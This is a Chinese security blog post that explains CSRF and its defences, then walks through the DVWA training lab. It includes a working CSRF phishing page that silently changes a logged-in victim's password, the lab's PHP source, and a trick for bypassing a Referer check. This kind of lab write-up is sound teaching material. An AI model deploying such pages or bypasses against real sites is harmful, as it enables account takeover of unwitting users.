<!DOCTYPE html>
<html lang="en">
    <head>
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta http-equiv="content-type" content="text/html; charset=utf-8">

      <!-- Enable responsiveness on mobile devices-->
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

      <title>Baz&#x27;s blog</title>

      
        <link rel="alternate" type="application/atom+xml" title="RSS" href="https://baz.ee/atom.xml">
      

      
          <link rel="stylesheet" href="https://baz.ee/site.css">
      

      
      
    </head>

    <body class="hack dark main container">
        
    
        
                
                    <header>
                        <nav itemscope itemtype="http://schema.org/SiteNavigationElement">
                        
                            <a itemprop="url"
                               class=""
                               href="https:&#x2F;&#x2F;baz.ee">
                                <span itemprop="name">Home
                                </span></a>
                        
                            <a itemprop="url"
                               class=""
                               href="https:&#x2F;&#x2F;baz.ee&#x2F;categories">
                                <span itemprop="name">Categories
                                </span></a>
                        
                            <a itemprop="url"
                               class=""
                               href="https:&#x2F;&#x2F;baz.ee&#x2F;tags">
                                <span itemprop="name">Tags
                                </span></a>
                        
                        </nav>
                    </header>
                
            
    

<article itemscope itemtype="http://schema.org/BlogPosting">
    <header>
        <h1 itemprop="headline">CSRF跨站请求伪造漏洞</h1>
        <span class="muted">
    <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32"
         width="16" height="16" fill="none" stroke="currentcolor"
         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
        <circle cx="16" cy="16" r="14"/>
        <path d="M16 8 L16 16 20 20"/>
    </svg>
    <span>10 minute read</span>
    <svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32"
         width="16" height="16" fill="none" stroke="currentcolor"
         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
        <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z"/>
    </svg>

    Published: 2021-06-22
</span>
    </header>
    <div itemprop="articleBody">
      <h1 id="csrfde-ding-yi">csrf的定义</h1>
<p>攻击者在<strong>一定的攻击条件</strong>下，<strong>利用被攻击者的身份</strong>向服务器发起请求，</p>
<span id="continue-reading"></span>
<p>服务器可以正常解析并<strong>返回正确结果</strong><br /><strong><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624375922566-5bac7b83-1e73-4757-a59d-5fc863c610c1.png#align=left&amp;display=inline&amp;height=768&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8B%E5%8D%8811.31.41.png&amp;originHeight=768&amp;originWidth=1668&amp;size=677535&amp;status=done&amp;style=none&amp;width=1668" alt="截屏2021-06-22 下午11.31.41.png" /></strong></p>
<h1 id="csrffa-sheng-de-tiao-jian">csrf发生的条件</h1>
<ul>
<li>被攻击者在【网站A】处于登陆状态</li>
<li>必须要在【网站A】同浏览器中打开黑客的链接</li>
<li>后台身份验证不严格（例如除cookie外无其他验证）</li>
</ul>
<h1 id="csrfneng-zuo-shi-yao">csrf能做什么</h1>
<ul>
<li>发邮件</li>
<li>发消息</li>
<li>财产操作比如转账、或者购买商品</li>
<li>修改密码</li>
<li>删除文章</li>
</ul>
<h1 id="csrffang-yu">csrf防御</h1>
<ul>
<li>验证HTTP Referer字段</li>
</ul>
<p>在HTTP头中有个字段是Refere，记录了HTTP请求的来源地址，在正常的页面请求中，如果用户是点击按钮等正常点击跳转都会将Referer发送给服务器，程序只需拿到值之后进行校验，如果没有或者是其他网站的话就可能是csrf攻击。</p>
<ul>
<li>请求参数添加token验证</li>
</ul>
<p>csrf之所以能够成功，是因为攻击者可以伪造用户的请求，请求中所有的用户验证信息都在cookie中。我们要找一个不可伪造的参数来校验请求是否伪造，可以在请求中加入随机的token，每次的请求都随机，这样服务端验证token即可。</p>
<ul>
<li>在HTTP头中添加自定义属性</li>
</ul>
<p>该方法也是使用token验证，和第二种方法不同的是，并不是将token放到HTTP参数中，而是放到HTTP自定义属性中，这样一次性给所有的HTTP请求都添加了token，解决了第二种方法挨个添加的不便，同时token不会记录到地址栏中，减少了token泄漏的风险。</p>
<ul>
<li>验证码</li>
</ul>
<p>验证码和token验证一样，都具有随机性，可以很好的解决CSRF的问题，但很多时候为了用户体验，网站不能给所有的操作都加上验证码，所以验证码只能作为一种辅助手段。</p>
<h1 id="dvwazhong-de-csrf">DVWA中的CSRF</h1>
<h2 id="low">LOW</h2>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624381175607-df3d7d1d-5688-4a8b-a511-2a2090368042.png#align=left&amp;display=inline&amp;height=1746&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-23%20%E4%B8%8A%E5%8D%8812.58.35.png&amp;originHeight=1746&amp;originWidth=2784&amp;size=404646&amp;status=done&amp;style=none&amp;width=2784" alt="截屏2021-06-23 上午12.58.35.png" /><br />输入用户名和密码<br />admin<br />password<br />成功进入<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624381205289-eaf8c6ee-efd7-474a-8151-dc290b059820.png#align=left&amp;display=inline&amp;height=1746&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-23%20%E4%B8%8A%E5%8D%8812.59.53.png&amp;originHeight=1746&amp;originWidth=2784&amp;size=534575&amp;status=done&amp;style=none&amp;width=2784" alt="截屏2021-06-23 上午12.59.53.png" /><br />这里可以修改密码，我们把密码修改成lalala<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624381299690-d9b1ba57-7894-41ee-b0a9-7c3f6e227c81.png#align=left&amp;display=inline&amp;height=1746&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-23%20%E4%B8%8A%E5%8D%881.01.07.png&amp;originHeight=1746&amp;originWidth=2784&amp;size=556136&amp;status=done&amp;style=none&amp;width=2784" alt="截屏2021-06-23 上午1.01.07.png" /><br />注意上图中的URL，我们发现修改的新密码通过URL传递到服务器<br />由此构造钓鱼网页<br />写下如下代码</p>
<pre data-lang="html" style="background-color:#2b303b;color:#c0c5ce;" class="language-html "><code class="language-html" data-lang="html"><span>&lt;</span><span style="color:#bf616a;">html</span><span>&gt;
</span><span>	&lt;</span><span style="color:#bf616a;">head</span><span>&gt;
</span><span>		&lt;</span><span style="color:#bf616a;">meta </span><span style="color:#d08770;">charset</span><span>=&quot;</span><span style="color:#a3be8c;">UTF-8</span><span>&quot;&gt;
</span><span>		&lt;</span><span style="color:#bf616a;">title</span><span>&gt;CSRF&lt;/</span><span style="color:#bf616a;">title</span><span>&gt;
</span><span>		&lt;</span><span style="color:#bf616a;">script</span><span>&gt;
</span><span>		</span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">abc</span><span>(){
</span><span>			</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">im </span><span>= new </span><span style="color:#bf616a;">Image</span><span>();
</span><span>			</span><span style="color:#bf616a;">im</span><span>.src = &quot;</span><span style="color:#a3be8c;">http://127.0.0.1:8081/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</span><span>&quot;;
</span><span>		}
</span><span>		&lt;/</span><span style="color:#bf616a;">script</span><span>&gt;
</span><span>	&lt;/</span><span style="color:#bf616a;">head</span><span>&gt;
</span><span>		&lt;</span><span style="color:#bf616a;">body</span><span>&gt;
</span><span>			&lt;</span><span style="color:#bf616a;">img </span><span style="color:#d08770;">src</span><span>=&quot;</span><span style="color:#a3be8c;">timg.png</span><span>&quot; </span><span style="color:#d08770;">width</span><span>=&quot;</span><span style="color:#a3be8c;">100%</span><span>&quot; </span><span style="color:#d08770;">height</span><span>=&quot;</span><span style="color:#a3be8c;">100%</span><span>&quot; </span><span style="color:#d08770;">onclick</span><span>=&quot;</span><span style="color:#bf616a;">abc</span><span>()&quot;&gt;
</span><span>		&lt;/</span><span style="color:#bf616a;">body</span><span>&gt;
</span><span>&lt;/</span><span style="color:#bf616a;">html</span><span>&gt;
</span></code></pre>
<p>找到一张诱导人点击的图片<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624381475919-903d004a-e340-41a6-a44d-dfbbe7e91fa0.png#align=left&amp;display=inline&amp;height=227&amp;margin=%5Bobject%20Object%5D&amp;name=timg.png&amp;originHeight=1326&amp;originWidth=2646&amp;size=4462229&amp;status=done&amp;style=none&amp;width=452" alt="timg.png" /><br />制成网页后，在网站上发布这个网页<br />当受害人在登陆DVWA后，在并没有关掉DVWA的情况下，又用打开DVWA的浏览器打开了我们制作的网页，则受害人的DVWA的密码将会被改成我们的密码，如下<br />假使受害人点开了我们的钓鱼网页<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624381876786-567f93e2-baa8-4bd6-9367-4f195c7a6cb2.png#align=left&amp;display=inline&amp;height=1746&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-23%20%E4%B8%8A%E5%8D%881.10.25.png&amp;originHeight=1746&amp;originWidth=2784&amp;size=6284211&amp;status=done&amp;style=none&amp;width=2784" alt="截屏2021-06-23 上午1.10.25.png" /><br />且经不住诱惑，点击了网页中的任何区域<br />到这里CSRF攻击就完成了<br />之后我们再登陆DVWA，输入密码lalala，显示登陆失败<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624381949457-5d20916e-3388-4b40-8ac0-88c57d4faa65.png#align=left&amp;display=inline&amp;height=102&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-23%20%E4%B8%8A%E5%8D%881.11.39.png&amp;originHeight=154&amp;originWidth=290&amp;size=5630&amp;status=done&amp;style=none&amp;width=193" alt="截屏2021-06-23 上午1.11.39.png" /><br />只有输入我们自己的密码123456才能登陆成功</p>
<p>后台源码</p>
<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span>
</span><span style="color:#ab7967;">&lt;?php 
</span><span>
</span><span style="color:#b48ead;">if</span><span>( </span><span style="color:#96b5b4;">isset</span><span>( $</span><span style="color:#bf616a;">_GET</span><span>[ &#39;</span><span style="color:#a3be8c;">Change</span><span>&#39; ] ) ) { 
</span><span>    </span><span style="color:#65737e;">// Get input 
</span><span>    $</span><span style="color:#bf616a;">pass_new  </span><span>= $</span><span style="color:#bf616a;">_GET</span><span>[ &#39;</span><span style="color:#a3be8c;">password_new</span><span>&#39; ]; 
</span><span>    $</span><span style="color:#bf616a;">pass_conf </span><span>= $</span><span style="color:#bf616a;">_GET</span><span>[ &#39;</span><span style="color:#a3be8c;">password_conf</span><span>&#39; ]; 
</span><span>
</span><span>    </span><span style="color:#65737e;">// Do the passwords match? 
</span><span>    </span><span style="color:#b48ead;">if</span><span>( $</span><span style="color:#bf616a;">pass_new </span><span>== $</span><span style="color:#bf616a;">pass_conf </span><span>) { 
</span><span>        </span><span style="color:#65737e;">// They do! 
</span><span>        $</span><span style="color:#bf616a;">pass_new </span><span>= ((</span><span style="color:#96b5b4;">isset</span><span>($</span><span style="color:#bf616a;">GLOBALS</span><span>[&quot;</span><span style="color:#a3be8c;">___mysqli_ston</span><span>&quot;]) &amp;&amp; </span><span style="color:#96b5b4;">is_object</span><span>($</span><span style="color:#bf616a;">GLOBALS</span><span>[&quot;</span><span style="color:#a3be8c;">___mysqli_ston</span><span>&quot;])) ? </span><span style="color:#96b5b4;">mysqli_real_escape_string</span><span>($</span><span style="color:#bf616a;">GLOBALS</span><span>[&quot;</span><span style="color:#a3be8c;">___mysqli_ston</span><span>&quot;],  $</span><span style="color:#bf616a;">pass_new </span><span>) : ((</span><span style="color:#96b5b4;">trigger_error</span><span>(&quot;</span><span style="color:#a3be8c;">[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.</span><span>&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); 
</span><span>        $</span><span style="color:#bf616a;">pass_new </span><span>= </span><span style="color:#96b5b4;">md5</span><span>( $</span><span style="color:#bf616a;">pass_new </span><span>); 
</span><span>
</span><span>        </span><span style="color:#65737e;">// Update the database 
</span><span>        $</span><span style="color:#bf616a;">insert </span><span>= &quot;</span><span style="color:#b48ead;">UPDATE </span><span>`</span><span style="color:#a3be8c;">users</span><span>` </span><span style="color:#b48ead;">SET</span><span style="color:#a3be8c;"> password </span><span>= &#39;$</span><span style="color:#bf616a;">pass_new</span><span>&#39; </span><span style="color:#b48ead;">WHERE</span><span style="color:#a3be8c;"> user </span><span>= &#39;&quot; . </span><span style="color:#bf616a;">dvwaCurrentUser</span><span>() . &quot;</span><span style="color:#a3be8c;">&#39;;</span><span>&quot;; 
</span><span>        $</span><span style="color:#bf616a;">result </span><span>= </span><span style="color:#96b5b4;">mysqli_query</span><span>($</span><span style="color:#bf616a;">GLOBALS</span><span>[&quot;</span><span style="color:#a3be8c;">___mysqli_ston</span><span>&quot;],  $</span><span style="color:#bf616a;">insert </span><span>) or </span><span style="color:#b48ead;">die</span><span>( &#39;</span><span style="color:#a3be8c;">&lt;pre&gt;</span><span>&#39; . ((</span><span style="color:#96b5b4;">is_object</span><span>($</span><span style="color:#bf616a;">GLOBALS</span><span>[&quot;</span><span style="color:#a3be8c;">___mysqli_ston</span><span>&quot;])) ? </span><span style="color:#96b5b4;">mysqli_error</span><span>($</span><span style="color:#bf616a;">GLOBALS</span><span>[&quot;</span><span style="color:#a3be8c;">___mysqli_ston</span><span>&quot;]) : (($</span><span style="color:#bf616a;">___mysqli_res </span><span>= </span><span style="color:#96b5b4;">mysqli_connect_error</span><span>()) ? $</span><span style="color:#bf616a;">___mysqli_res</span><span> : </span><span style="color:#d08770;">false</span><span>)) . &#39;</span><span style="color:#a3be8c;">&lt;/pre&gt;</span><span>&#39; );
</span><span>
</span><span>        </span><span style="color:#65737e;">// Feedback for the user 
</span><span>        </span><span style="color:#96b5b4;">echo </span><span>&quot;</span><span style="color:#a3be8c;">&lt;pre&gt;Password Changed.&lt;/pre&gt;</span><span>&quot;; 
</span><span>    } 
</span><span>    </span><span style="color:#b48ead;">else </span><span>{ 
</span><span>        </span><span style="color:#65737e;">// Issue with passwords matching 
</span><span>        </span><span style="color:#96b5b4;">echo </span><span>&quot;</span><span style="color:#a3be8c;">&lt;pre&gt;Passwords did not match.&lt;/pre&gt;</span><span>&quot;; 
</span><span>    } 
</span><span>
</span><span>    ((</span><span style="color:#96b5b4;">is_null</span><span>($</span><span style="color:#bf616a;">___mysqli_res </span><span>= </span><span style="color:#96b5b4;">mysqli_close</span><span>($</span><span style="color:#bf616a;">GLOBALS</span><span>[&quot;</span><span style="color:#a3be8c;">___mysqli_ston</span><span>&quot;]))) ? </span><span style="color:#d08770;">false</span><span> : $</span><span style="color:#bf616a;">___mysqli_res</span><span>); 
</span><span>} 
</span><span>
</span><span style="color:#ab7967;">?&gt; 
</span></code></pre>
<h2 id="medium-refererjian-ce-rao-guo">MEDIUM（referer检测绕过）</h2>
<p>这里再用LOW中的方法便会失败<br />burp抓包<br />当我们正常发包时，可以发现密码被成功改变<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624382862089-da1626d7-e058-4126-b6ac-1e8d6f76f193.png#align=left&amp;display=inline&amp;height=1762&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-23%20%E4%B8%8A%E5%8D%881.27.26.png&amp;originHeight=1762&amp;originWidth=2696&amp;size=750354&amp;status=done&amp;style=none&amp;width=2696" alt="截屏2021-06-23 上午1.27.26.png" /><br />而我们更改一下发送包中的Referer，便会发现密码更改失败<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624382796236-c94c8b22-64ce-41fc-aa8f-2812193a4c9d.png#align=left&amp;display=inline&amp;height=1762&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-23%20%E4%B8%8A%E5%8D%881.26.18.png&amp;originHeight=1762&amp;originWidth=2696&amp;size=751608&amp;status=done&amp;style=none&amp;width=2696" alt="截屏2021-06-23 上午1.26.18.png" /><br />由此发现服务器端用了referer校验</p>
<p>这里查看一下后台代码</p>
<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span style="color:#ab7967;">&lt;?php
</span><span>
</span><span style="color:#b48ead;">if</span><span>( </span><span style="color:#96b5b4;">isset</span><span>( $</span><span style="color:#bf616a;">_GET</span><span>[ &#39;</span><span style="color:#a3be8c;">Change</span><span>&#39; ] ) ) {
</span><span>    </span><span style="color:#65737e;">// Checks to see where the request came from
</span><span>    </span><span style="color:#b48ead;">if</span><span>( </span><span style="color:#96b5b4;">stripos</span><span>( $</span><span style="color:#bf616a;">_SERVER</span><span>[ &#39;</span><span style="color:#a3be8c;">HTTP_REFERER</span><span>&#39; ] ,$</span><span style="color:#bf616a;">_SERVER</span><span>[ &#39;</span><span style="color:#a3be8c;">SERVER_NAME</span><span>&#39; ]) !== </span><span style="color:#d08770;">false </span><span>) {
</span><span>        </span><span style="color:#65737e;">// Get input
</span><span>        $</span><span style="color:#bf616a;">pass_new  </span><span>= $</span><span style="color:#bf616a;">_GET</span><span>[ &#39;</span><span style="color:#a3be8c;">password_new</span><span>&#39; ];
</span><span>        $</span><span style="color:#bf616a;">pass_conf </span><span>= $</span><span style="color:#bf616a;">_GET</span><span>[ &#39;</span><span style="color:#a3be8c;">password_conf</span><span>&#39; ];
</span><span>
</span><span>        </span><span style="color:#65737e;">// Do the passwords match?
</span><span>        </span><span style="color:#b48ead;">if</span><span>( $</span><span style="color:#bf616a;">pass_new </span><span>== $</span><span style="color:#bf616a;">pass_conf </span><span>) {
</span><span>            </span><span style="color:#65737e;">// They do!
</span><span>            $</span><span style="color:#bf616a;">pass_new </span><span>= ((</span><span style="color:#96b5b4;">isset</span><span>($</span><span style="color:#bf616a;">GLOBALS</span><span>[&quot;</span><span style="color:#a3be8c;">___mysqli_ston</span><span>&quot;]) &amp;&amp; </span><span style="color:#96b5b4;">is_object</span><span>($</span><span style="color:#bf616a;">GLOBALS</span><span>[&quot;</span><span style="color:#a3be8c;">___mysqli_ston</span><span>&quot;])) ? </span><span style="color:#96b5b4;">mysqli_real_escape_string</span><span>($</span><span style="color:#bf616a;">GLOBALS</span><span>[&quot;</span><span style="color:#a3be8c;">___mysqli_ston</span><span>&quot;],  $</span><span style="color:#bf616a;">pass_new </span><span>) : ((</span><span style="color:#96b5b4;">trigger_error</span><span>(&quot;</span><span style="color:#a3be8c;">[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.</span><span>&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
</span><span>            $</span><span style="color:#bf616a;">pass_new </span><span>= </span><span style="color:#96b5b4;">md5</span><span>( $</span><span style="color:#bf616a;">pass_new </span><span>);
</span><span>
</span><span>            </span><span style="color:#65737e;">// Update the database
</span><span>            $</span><span style="color:#bf616a;">insert </span><span>= &quot;</span><span style="color:#b48ead;">UPDATE </span><span>`</span><span style="color:#a3be8c;">users</span><span>` </span><span style="color:#b48ead;">SET</span><span style="color:#a3be8c;"> password </span><span>= &#39;$</span><span style="color:#bf616a;">pass_new</span><span>&#39; </span><span style="color:#b48ead;">WHERE</span><span style="color:#a3be8c;"> user </span><span>= &#39;&quot; . </span><span style="color:#bf616a;">dvwaCurrentUser</span><span>() . &quot;</span><span style="color:#a3be8c;">&#39;;</span><span>&quot;;
</span><span>            $</span><span style="color:#bf616a;">result </span><span>= </span><span style="color:#96b5b4;">mysqli_query</span><span>($</span><span style="color:#bf616a;">GLOBALS</span><span>[&quot;</span><span style="color:#a3be8c;">___mysqli_ston</span><span>&quot;],  $</span><span style="color:#bf616a;">insert </span><span>) or </span><span style="color:#b48ead;">die</span><span>( &#39;</span><span style="color:#a3be8c;">&lt;pre&gt;</span><span>&#39; . ((</span><span style="color:#96b5b4;">is_object</span><span>($</span><span style="color:#bf616a;">GLOBALS</span><span>[&quot;</span><span style="color:#a3be8c;">___mysqli_ston</span><span>&quot;])) ? </span><span style="color:#96b5b4;">mysqli_error</span><span>($</span><span style="color:#bf616a;">GLOBALS</span><span>[&quot;</span><span style="color:#a3be8c;">___mysqli_ston</span><span>&quot;]) : (($</span><span style="color:#bf616a;">___mysqli_res </span><span>= </span><span style="color:#96b5b4;">mysqli_connect_error</span><span>()) ? $</span><span style="color:#bf616a;">___mysqli_res</span><span> : </span><span style="color:#d08770;">false</span><span>)) . &#39;</span><span style="color:#a3be8c;">&lt;/pre&gt;</span><span>&#39; );
</span><span>
</span><span>            </span><span style="color:#65737e;">// Feedback for the user
</span><span>            </span><span style="color:#96b5b4;">echo </span><span>&quot;</span><span style="color:#a3be8c;">&lt;pre&gt;Password Changed.&lt;/pre&gt;</span><span>&quot;;
</span><span>        }
</span><span>        </span><span style="color:#b48ead;">else </span><span>{
</span><span>            </span><span style="color:#65737e;">// Issue with passwords matching
</span><span>            </span><span style="color:#96b5b4;">echo </span><span>&quot;</span><span style="color:#a3be8c;">&lt;pre&gt;Passwords did not match.&lt;/pre&gt;</span><span>&quot;;
</span><span>        }
</span><span>    }
</span><span>    </span><span style="color:#b48ead;">else </span><span>{
</span><span>        </span><span style="color:#65737e;">// Didn&#39;t come from a trusted source
</span><span>        </span><span style="color:#96b5b4;">echo </span><span>&quot;</span><span style="color:#a3be8c;">&lt;pre&gt;That request didn&#39;t look correct.&lt;/pre&gt;</span><span>&quot;;
</span><span>    }
</span><span>
</span><span>    ((</span><span style="color:#96b5b4;">is_null</span><span>($</span><span style="color:#bf616a;">___mysqli_res </span><span>= </span><span style="color:#96b5b4;">mysqli_close</span><span>($</span><span style="color:#bf616a;">GLOBALS</span><span>[&quot;</span><span style="color:#a3be8c;">___mysqli_ston</span><span>&quot;]))) ? </span><span style="color:#d08770;">false</span><span> : $</span><span style="color:#bf616a;">___mysqli_res</span><span>);
</span><span>}
</span><span>
</span><span style="color:#ab7967;">?&gt;
</span><span>
</span></code></pre>
<p>可以看到，后台源码只判断referer中是否存在含有DVWA网站地址的字符串<br />这里只需要将我们的钓鱼网页的名称改为目标网站的地址即可绕过<br />这里burp怎么也抓不到包，借用margin视频中的截图<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624384064585-272baa24-1ffd-4fa8-ba76-cf79071327f6.png#align=left&amp;display=inline&amp;height=886&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-23%20%E4%B8%8A%E5%8D%881.47.30.png&amp;originHeight=886&amp;originWidth=1372&amp;size=766843&amp;status=done&amp;style=none&amp;width=1372" alt="截屏2021-06-23 上午1.47.30.png" /><br />请看包中的referer值</p>
<h1 id="igamingba-chang">igaming靶场</h1>
<p>这个cms我安装失败了……<br />不过利用方法跟上面那个相同，只不过GET请求，变成了POST请求</p>
<h1 id="espcmsba-chang">ESPCMS靶场</h1>
<p>我累了，不想安装这个了……<br />利用方法与上面igaming相同</p>

    </div>

    
        <footer>
            <hr>
            <p>
                
                    Published by Baz
                
                
                    
                    in <a href="https://baz.ee/categories/an-quan/">安全</a>
                
                
            </p>
            
            
        </footer>
    
</article>


    </body>

</html>
